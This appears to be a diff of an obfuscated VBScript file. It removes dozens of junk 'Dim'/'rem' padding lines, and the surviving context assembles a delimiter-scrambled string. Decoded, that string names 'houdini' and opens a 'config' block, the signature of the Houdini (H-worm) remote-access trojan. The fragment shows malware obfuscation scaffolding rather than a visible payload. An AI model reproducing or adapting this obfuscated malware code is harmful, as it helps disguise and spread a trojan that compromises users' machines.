@@ -60,46 +60,6 @@ Dim byxntzlzxfx : byxntzlzxfx = "☼"
 Dim hwdchtdgndg : hwdchtdgndg = "♪"
 Dim xubmddlvyxw : xubmddlvyxw = "☻"
 Dim dejvbbflozc : dejvbbflozc = "☻"
-Dim ZqCwpVZYnnKhneGcQbFKwocCu
-rem ZlngmiJWrhjHBMUFoPMFgrxxw
-Dim TpNpSVVEwzZQNLfsEksRfDqTq
-rem WYLJyaxdqkqyEifNTMSlMtOWl
-Dim KvtFHYJXdMOllkDrvUbuRhkQf
-rem avrLegVPhLHISttDWpmclpIBI
-Dim mgXibSCcBseHVBrjenoDLZzsH
-rem QSmGOjFdihWQFhdjtrKiaJkXo
-Dim GGeectINyBUGaGDjBXxbEyuPK
-rem LRuOCgpYcsfQPoabNnJmJTXkC
-Dim adWzCfZqCwpVZYnnKhneGcQbF
-rem KwocCuZlngmiJWrhjHBMUFoPM
-Dim FgrxxwTpNpSVVEwzZQNLfsEks
-rem RfDqTqWYLJyaxdqkqyEifNTMS
-Dim ziCZkThbCPfrflJitzTyIXbrF
-rem aNvzYRFcWiEumZwiesUCVIkMT
-Dim HzLtQtYvlwGIlGQCEfmSWxEJL
-rem OiBpXeUUYeZyPJwvjYOwHyVXg
-Dim xDgzkKPPRRGVsDoSreFeIxQkn
-rem GBnaEghNbtlvMrHXuUELFFDKf
-Dim TfpkymDHkomRVMlcMQVqKJhvK
-rem RPGYFOgdKHmbBTJuTwgjXwxeS
-Dim jsOKZiPuWdncqLSLUQmNdoVUS
-rem huCByXaROMpWjqhgnDdHMzWoN
-Dim daIMxspxmVypvGlZRWuzfxVpp
-rem oskGXPDDboraOGkwBbYBcwRCs
-Dim mmtyiqephCYCqbzdPsTPUlNRY
-rem UjnNfhtwQLlRrsqEVnZfdcyrt
-Dim cfnmkvdIuozhEENNemXIKUXEO
-rem EtnUzJPSKFBvwDFVTbiWelarB
-Dim hOPIgRquLznTOfyLTaQjzHiYQ
-rem WggvcgNEeqPZvHheTFQpgbqdu
-Dim xkcdRUxXZhBxZbkJJGMiIisYY
-rem SHLQrIwalSolDatjMjyWvuKOJ
-Dim fjojKSdaIMxspxmVypvGlZRWu
-rem zfxVpposkGXPDDboraOGkwBbY
-Dim BcwRCsmmtyiqephCYCqbzdPsT
-rem PUlNRYUjnNfhtwQLlRrsqEVnZ
-Dim fdcyrtcfnmkvdIuozhEENNemX
-rem IKUXEOEtnUzJPSKFBvwDFVTbi
 cmgshluxhhswxjbecpznmhvqkshqilutvquzdxwiurnmhneuulyicdaurgzteyfvpiyxarjwodlvjvszopzgfnophmjnqbtqjejilovretmpxghieqczdnoamctsfkqsilugurqqdjdpmnhqppcmwsgkzyovrshargewowqmqcucsmsqutwtcwpctgcqxrvwwwuavflo = "'<!****![____|$|____ !****!r____|$|____!****!e____|$|____!****!c____|$|____!****!o____|$|____!****!d____|$|____!****!e____|$|____!****!r____|$|____ : !****!h____|$|____!****!o____|$|____!****!u____|$|____!****!d____|$|____!****!i____|$|____!****!n____|$|____!****!i____|$|____ (!****!c____|$|____) !****!s____|$|____!****!k____|$|____y!****!p____|$|____!****!e____|$|____ : !****!h____|$|____!****!o____|$|____!****!u____|$|____!****!d____|$|____!****!i____|$|____!****!n____|$|____!****!i____|$|____!****!-____|$|____!****!f____|$|____!****!x____|$|____ !****!]____|$|____>" & _
 vbCrLf & "" & _
 vbCrLf & "'!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____ !****!c____|$|____!****!o____|$|____!****!n____|$|____!****!f____|$|____!****!i____|$|____!****!g____|$|____ !****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____!****!-____|$|____!****!=____|$|____" & _
